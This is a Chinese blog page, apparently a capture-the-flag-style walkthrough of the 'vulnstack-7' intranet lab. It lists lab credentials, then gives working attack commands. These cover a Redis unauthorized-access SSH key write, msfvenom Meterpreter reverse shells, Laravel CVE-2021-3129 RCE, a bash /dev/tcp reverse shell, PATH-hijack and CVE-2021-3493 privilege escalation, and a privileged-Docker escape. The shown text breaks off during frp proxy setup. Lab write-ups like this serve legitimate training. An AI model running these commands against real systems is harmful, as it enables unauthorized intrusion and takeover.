@@ -1,0 +1,1126 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/%E8%95%BE%E5%A7%86.png">
+  <link rel="icon" href="/img/%E8%95%BE%E5%A7%86.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#58C9B9">
+  <meta name="author" content="SCxiaoyun">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言： 此靶场复现过程来自某位备受靶场环境折磨的友人……😬😬😬 *配置*   在Vmware中新增两个虚拟网卡VMnet8、VMnet14。VMnet8设为默认的NAT模式，IP段设为 10.10.10.0&#x2F;24；VMnet14设为仅主机模式，IP段设为192.168.93.0&#x2F;24   将VMnet8作为第二层网络的网卡，VMnet14作为第三层网络的网卡。这样，第二层网络中的所有主机 皆">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日内网靶场vulnstack-7">
+<meta property="og:url" content="https://jsweetcoffee.github.io/posts/f656209c.html">
+<meta property="og:site_name" content="晓雲的陋室">
+<meta property="og:description" content="前言： 此靶场复现过程来自某位备受靶场环境折磨的友人……😬😬😬 *配置*   在Vmware中新增两个虚拟网卡VMnet8、VMnet14。VMnet8设为默认的NAT模式，IP段设为 10.10.10.0&#x2F;24；VMnet14设为仅主机模式，IP段设为192.168.93.0&#x2F;24   将VMnet8作为第二层网络的网卡，VMnet14作为第三层网络的网卡。这样，第二层网络中的所有主机 皆">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps1.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps2.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps3.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps4.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps5.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps6.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps7.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps8.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps9.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps10.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps11.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps12.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps13.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps14.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps15.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps16.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps17.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps18.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps19.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps20.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps21.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps22.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps23.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps24.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps25.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps27.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps28.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps29.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps30.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps31.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps32.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps33.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps34.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps35.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps36.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps37.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps38.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps39.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps40.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps41.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps42.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps43.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps44.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps45.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps46.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps47.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps48.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps49.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps50.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps51.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps52.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps53.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps54.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps55.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps56.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps57.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps58.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps59.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps60.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps61.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps62.jpg">
+<meta property="article:published_time" content="2023-09-03T16:38:16.000Z">
+<meta property="article:modified_time" content="2023-09-03T16:48:58.000Z">
+<meta property="article:author" content="SCxiaoyun">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://jsweetcoffee.github.io/posts/f656209c/wps1.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>红日内网靶场vulnstack-7 - 晓雲的陋室</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"jsweetcoffee.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":50,"cursorChar":"♫","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading2.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":"ture","follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>聊五分钱的天吗？|ω･)و ̑̑༉</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/pic9.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="红日内网靶场vulnstack-7"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        SCxiaoyun
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-04 00:38" pubdate>
+          2023年9月4日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          66 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">红日内网靶场vulnstack-7</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年9月4日 凌晨
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1>前言：</h1>
+<p><strong>此靶场复现过程来自某位备受靶场环境折磨的友人……</strong>😬😬😬</p>
+<h1><em><strong>*配置*</strong></em></h1>
+<img src="/posts/f656209c/wps1.jpg" class title="img"> 
+<p>在Vmware中新增两个虚拟网卡VMnet8、VMnet14。VMnet8设为默认的NAT模式，IP段设为 10.10.10.0/24；VMnet14设为仅主机模式，IP段设为192.168.93.0/24</p>
+<img src="/posts/f656209c/wps2.jpg" class title="img"> 
+<p>将VMnet8作为第二层网络的网卡，VMnet14作为第三层网络的网卡。这样，第二层网络中的所有主机 皆可以上网，但是位于第三层网络中的所有主机都不与外网相连通，不能上网。</p>
+<p>DMZ区域：</p>
+<p>给Ubuntu (Web 1) 配置了两个网卡，一个桥接可以对外提供服务；一个连接在VMnet8上连通第二 层网络。</p>
+<p>第二层网络区域：</p>
+<p>给Ubuntu (Web 2) 和Windows 7 (PC 1)都配置了两个网卡，一个连接在VMnet8上连通第二层网 络，一个连接在VMnet14上连通第三层网络。</p>
+<p>第三次网络区域：</p>
+<p>给Windows Server 2012和Windows 7 (PC 2)都只配置了一个网卡，一个连接在VMnet14上连通第 三层网络。</p>
+<h4 id="服务配置"><a class="header-anchor" href="#服务配置">¶</a><em><strong>*服务配置*</strong></em></h4>
+<p>靶场中各个主机都运行着相应的服务并且没有自启功能，如果你关闭了靶机，再次启动时还需要在相应 的主机上启动靶机服务：</p>
+<p>DMZ区的 Ubuntu 需要启动nginx服务：</p>
+<p>sudo su<br>
+redis-server /etc/redis.conf<br>
+/usr/sbin/nginx -c /etc/nginx/nginx.conf<br>
+iptables -F  /关闭防火墙</p>
+<p><img src="/posts/f656209c/wps3.jpg" alt="img"><img src="/posts/f656209c/wps4.jpg" alt="img"></p>
+<p>第二层网络的 Ubuntu需要启动docker容器：</p>
+<p>sudo service docker start<br>
+sudo docker start 8e172820ac78</p>
+<img src="/posts/f656209c/wps5.jpg" class title="img"> 
+<p>第三层网络的 Windows 7 （PC 1）需要启动通达OA：</p>
+<p>C:\MYOA\bin\AutoConfig.exe</p>
+<img src="/posts/f656209c/wps6.jpg" class title="img"> 
+<h4 id="域用户信息"><a class="header-anchor" href="#域用户信息">¶</a><em><strong>*域用户信息*</strong></em></h4>
+<p>域用户账户和密码如下：</p>
+<p>Administrator：Whoami2021<br>
+whoami：Whoami2021<br>
+bunny：Bunny2021<br>
+moretz：Moretz2021</p>
+<p>Ubuntu 1：</p>
+<p>web：web2021</p>
+<p>Ubuntu 2：</p>
+<p>ubuntu：ubuntu</p>
+<p>通达OA账户：</p>
+<p>admin：admin657260</p>
+<h4 id="ip信息"><a class="header-anchor" href="#ip信息">¶</a><em><strong>*ip信息*</strong></em></h4>
+<p>kali<br>
+192.168.3.239<br>
+web1<br>
+192.168.3.156<br>
+192.168.52.10<br>
+web2<br>
+192.168.52.20<br>
+192.168.93.10<br>
+pc1<br>
+192.168.52.30<br>
+192.168.93.20<br>
+pc2<br>
+192.168.93.40<br>
+dc<br>
+192.168.93.30</p>
+<h1><em><strong>*外网打点*</strong></em></h1>
+<h4 id="主机探测"><a class="header-anchor" href="#主机探测">¶</a><em><strong>*主机探测*</strong></em></h4>
+<p>用nmap或者arp都可以，本人测试arp快一点</p>
+<p>nmap -sn 192.168.3.0/24<br>
+arp-scan -l</p>
+<img src="/posts/f656209c/wps7.jpg" class title="img"> 
+<p>接下来利用nmap扫描开放端口，开放22，80，81，6379端口</p>
+<p>nmap -n -v -sS --min-rate 10000 -p- -Pn 192.168.3.162</p>
+<img src="/posts/f656209c/wps8.jpg" class title="img"> 
+<p>访问一下80和81端口</p>
+<p><img src="/posts/f656209c/wps9.jpg" alt="img"><img src="/posts/f656209c/wps10.jpg" alt="img"></p>
+<h4 id="redis未授权访问"><a class="header-anchor" href="#redis未授权访问">¶</a><em><strong>*redis未授权访问*</strong></em></h4>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p>
+<p>redis-cli -h 192.168.3.156</p>
+<p>直接连上，输入info可以看到直接执行</p>
+<img src="/posts/f656209c/wps11.jpg" class title="img"> 
+<h4 id="本地生成密钥然后覆盖目标主机的密钥"><a class="header-anchor" href="#本地生成密钥然后覆盖目标主机的密钥">¶</a><em><strong>*本地生成密钥然后覆盖目标主机的密钥*</strong></em></h4>
+<p>攻击者在未授权访问redis的情况下，利用redis自身提供的config命令，可以进行写文件的操作，攻击者可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件夹的authotrized_keys文件中，进而可以使用对于私钥直接使用ssh服务登录目标服务器</p>
+<p>ssh-keygen -t rsa  #生成公钥<br>
+(echo -e “\n\n”; cat /root/.ssh/id_rsa.pub; echo -e “\n\n”) &gt; 1.txt  #将公钥导入1.txt文件<br>
+cat 1.txt | redis-cli -h 192.168.3.156 -p 6379 -x set hello  #把1.txt文件内容写入目标主机的redis缓冲中<br>
+config set dir /root/.ssh         #设置redis的备份路径为/root/.ssh/<br>
+config set dbfilename authorized_keys   #设置保存文件名为authorized_keys<br>
+save                   #将数据保存在目标服务器硬盘上<br>
+ssh <a href="mailto:root@192.168.3.156">root@192.168.3.156</a>            #连接</p>
+<p><img src="/posts/f656209c/wps12.jpg" alt="img"><img src="/posts/f656209c/wps13.jpg" alt="img"><img src="/posts/f656209c/wps14.jpg" alt="img"><img src="/posts/f656209c/wps15.jpg" alt="img"></p>
+<img src="/posts/f656209c/wps16.jpg" class title="img"> 
+<p>切换到家目录，查看</p>
+<p><img src="/posts/f656209c/wps17.jpg" alt="img"><img src="/posts/f656209c/wps18.jpg" alt="img"></p>
+<h4 id="上线msf"><a class="header-anchor" href="#上线msf">¶</a><em><strong>*上线msf*</strong></em></h4>
+<p>生成马子，利用拿到的ssh从网络上下载到ubuntu</p>
+<p>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.3.239 LPORT=6666 -f elf &gt; ubuntu.elf</p>
+<p>msf，启动！</p>
+<p>msfconsole<br>
+use exploit/multi/handler<br>
+set payload linux/x64/meterpreter/reverse_tcp<br>
+set lhost 192.168.3.239<br>
+set lport 6666<br>
+run</p>
+<p>chmod +x ubuntu.elf<br>
+./ubuntu.elf</p>
+<img src="/posts/f656209c/wps19.jpg" class title="img"> 
+<img src="/posts/f656209c/wps20.jpg" class title="img"> 
+<p>成功上线Ubuntu web1</p>
+<img src="/posts/f656209c/wps21.jpg" class title="img"> 
+<h4 id="添加路由"><a class="header-anchor" href="#添加路由">¶</a><em><strong>*添加路由*</strong></em></h4>
+<p>run get_local_subnets<br>
+run post/multi/manage/autoroute<br>
+run autoroute -p</p>
+<img src="/posts/f656209c/wps22.jpg" class title="img"> 
+<img src="/posts/f656209c/wps23.jpg" class title="img"> 
+<h4 id="Laravel-Debug-RCE（CVE-2021-3129）"><a class="header-anchor" href="#Laravel-Debug-RCE（CVE-2021-3129）">¶</a><em><strong>*Laravel Debug RCE（CVE-2021-3129）*</strong></em></h4>
+<p>81端口是个laravel版本在右下角写着，为8.29.0，存在远程命令执行漏洞Laravel Debug RCE（CVE-2021-3129）</p>
+<p>当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。这里直接使用工具 getshell，工具下载地址：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p>
+<p>可以写入哥斯拉的webshell（要使用低版本的哥斯拉，因为高版本的哥斯拉生成的马的加密方式已经改变了导致会连接失败）</p>
+<img src="/posts/f656209c/wps24.jpg" class title="img"> 
+<h4 id="linux环境变量提权"><a class="header-anchor" href="#linux环境变量提权">¶</a><em><strong>*linux环境变量提权*</strong></em></h4>
+<p>PATH是Linux和类Unix操作系统中的环境变量，它指定存储可执行程序的所有bin和sbin目录。当用户在终端上执行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以搜索可执行文件。超级用户通常还具有/sbin和/usr/sbin条目，以便于系统管理命令的执行。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/173903.html">https://www.freebuf.com/articles/system/173903.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_49340699/article/details/118801756">https://blog.csdn.net/weixin_49340699/article/details/118801756</a></p>
+<p>当前用户为 www-data，枚举具有SUID权限的所有二进制文件，发现 /home/jobs/shell</p>
+<p>find / -perm -u=s -type f 2&gt;/dev/null #\</p>
+<img src="/posts/f656209c/wps25.jpg" class title="img"> 
+<p>看到/home/jobs下有个shell，打算切换目录，但是无法执行，离谱，然后又在网站根目录上传了一个蚁剑的然后切换到那个目录</p>
+<p>find / -perm -u=s -type f 2&gt;/dev/null #<br>
+./shell<br>
+cp /bin/bash /tmp/ps<br>
+ls /tmp<br>
+echo $PATH<br>
+export PATH=/tmp:$PATH #将/tmp添加到环境变量中，并且先加载执行/tmp里的程序<br>
+这里由于是docker环境，需要先把shell反弹到ubuntu1再执行操作<br>
+nc -lvp 1234<br>
+webshell：bash -c ‘exec bash -i &gt;&amp; /dev/tcp/192.168.52.10/1234 0&gt;&amp;1’<br>
+更改$PATH来执行恶意程序，从而获得目标主机的 root 权限 shell</p>
+<p><img src="/posts/f656209c/wps27.jpg" alt="img"><img src="/posts/f656209c/wps28.jpg" alt="img"></p>
+<h4 id="docker特权模式逃逸"><a class="header-anchor" href="#docker特权模式逃逸">¶</a><em><strong>*docker特权模式逃逸*</strong></em></h4>
+<p>特权模式于版本 0.6 时被引入 docker，允许容器内的 root 拥有外部物理机 root 权限，而此前容器内 root 用户仅拥有外部物理机普通用户权限使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行 docker run —privileged 时，docker 容器将被允许访问主机上的所有设备，并可以执行 mount 命令进行挂载当控制使用特权模式启动的容器时，docker 管理员可通过 mount 命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令</p>
+<p>把 Laravel 的高权限 shell（192.168.52.20）再反弹到 ubuntu 18（192.168.52.10）中</p>
+<p>判断是否为docker 环境<br>
+1、使用下面命令，查看是否存在 dockerrnv 文件<br>
+ls -alh /.dockerenv</p>
+<p>2、查看系统进程的cgroup信息<br>
+cat /proc/1/cgroup</p>
+<img src="/posts/f656209c/wps29.jpg" class title="img"> 
+<p>fdisk -l   #查看磁盘文件<br>
+ls /dev    #查看设备文件<br>
+cd /<br>
+mkdir hello<br>
+mount /dev/sda1 /hello<br>
+ls /hello</p>
+<img src="/posts/f656209c/wps30.jpg" class title="img"> 
+<img src="/posts/f656209c/wps31.jpg" class title="img"> 
+<p>ssh-keygen -f hello<br>
+chmod 600 hello #赋予权限</p>
+<img src="/posts/f656209c/wps32.jpg" class title="img"> 
+<p>覆盖密匙：<br>
+cp -avx /hello/home/ubuntu/.ssh/id_rsa.pub /hello/home/ubuntu/.ssh/authorized_keys  #-avx将权限也一起复制<br>
+echo &gt; /hello/home/ubuntu/.ssh/authorized_keys 　　　　　　              #清空authorized_keys文件<br>
+echo ‘ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7hzizjmrEOuglTCmszsmOkJ1DowNdw20+z9hhSdpq6pl6Bpohp3f5V7WsdB09/blF8S+yWFSLDtdeDN4zQH6bKXyKOUBvBnxku+3v+xaNX5gTDj4mU9wEzrmiHNyDbKbpAbs8K7o85aOXxXzP0hMzpgI9zuB0kNDzj/p+IAmnQHC9PqR6YGSl1QoI3pIHWjXVk1aRuTN2bOBpCkF0OtgMBg8mNpPNoGnhKBq7zCMbIa6smhw71V6vnCxnmvhJQK6Ug72VWDK9uUIKX052adUnLqGBcF/2XqRLMGY4Hoe5iMT/Px1xErmC+q4/vfhCHdXpe8kmBr9aPoNJuVjVnpfZ root@ubuntu’ &gt; /hello/home/ubuntu/.ssh/authorized_keys    #将ssh秘钥写入authorized_keys文件<br>
+cat /hello/home/ubuntu/.ssh/authorized_keys  #查看是否写入成功<br>
+ssh -i hello <a href="mailto:ubuntu@192.168.52.20">ubuntu@192.168.52.20</a> #指定本地密钥登录</p>
+<p><img src="/posts/f656209c/wps33.jpg" alt="img"><img src="/posts/f656209c/wps34.jpg" alt="img"></p>
+<h1><em><strong>*上线Ubuntu web2*</strong></em></h1>
+<p>生成马子（低权限，现在最好不上线，一会提权完成在上线，但是不知道为什么我上线完之后两个session都莫名其妙死掉了，又重新上线了一遍）</p>
+<p>msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=7777 -f elf -o ubuntu2.elf</p>
+<p>上传shell</p>
+<img src="/posts/f656209c/wps35.jpg" class title="img"> 
+<p>上传成功</p>
+<img src="/posts/f656209c/wps36.jpg" class title="img"> 
+<p>开启http服务</p>
+<img src="/posts/f656209c/wps37.jpg" class title="img"> 
+<p>Ubuntu2wget下载<img src="/posts/f656209c/wps38.jpg" class title="img"></p>
+<p>开启监听</p>
+<p>use exploit/multi/handler<br>
+set payload linux/x64/meterpreter/bind_tcp<br>
+set rhost 192.168.52.20<br>
+set lport 7777<br>
+run</p>
+<img src="/posts/f656209c/wps39.jpg" class title="img"> 
+<h4 id="CVE-2021-3493-提权"><a class="header-anchor" href="#CVE-2021-3493-提权">¶</a><em><strong>*CVE-2021-3493*</strong></em><em><strong>*提权*</strong></em></h4>
+<p>当前登录用户是 ubuntu，查看系统信息，发现服务器在 cve-2021-3493 内核提权漏洞影响版本内</p>
+<p>漏洞原理：Linux内核中overlayfs文件系统中的Ubuntu特定问题，在该问题中，它未正确验证关于用户名称空间的文件系统功能的应用程序。由于Ubuntu附带了一个允许非特权的overlayfs挂载的补丁，因此本地攻击者可以使用它来获得更高的特权</p>
+<img src="/posts/f656209c/wps40.jpg" class title="img"> 
+<p>提权工具：<a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
+<p>这里就直接在目录下touch一个文件，然后把脚本内容写进去，或者输入重定向echo 脚本内容 &gt; 1.txt，然后执行编译，执行得到的文件，我们就获得了root权限，</p>
+<p>gcc exploit.c -o exploit<br>
+chmod +x exploit<br>
+./exploit</p>
+<h4 id="二上msf"><a class="header-anchor" href="#二上msf">¶</a><em><strong>*二上msf*</strong></em></h4>
+<p>操作和第一次一样，生成马子，upload上传，wget下载，加权限，执行，kali这边设置模块，run，添加路由，直接上截图<img src="/posts/f656209c/wps41.jpg" alt="img"><img src="/posts/f656209c/wps42.jpg" alt="img"><img src="/posts/f656209c/wps43.jpg" alt="img"></p>
+<h1><em><strong>*上线pc1*</strong></em></h1>
+<p>添加路由之后发现存在192.168.52.0网段的路由，于是搭建frp代理</p>
+<p>kali启动服务端<br>
+[common]<br>
+bind_port = 9100<br>
+ubuntu1启动客户端<br>
+#frpc.ini<br>
+[common]<br>
+server_addr = 192.168.3.239<br>
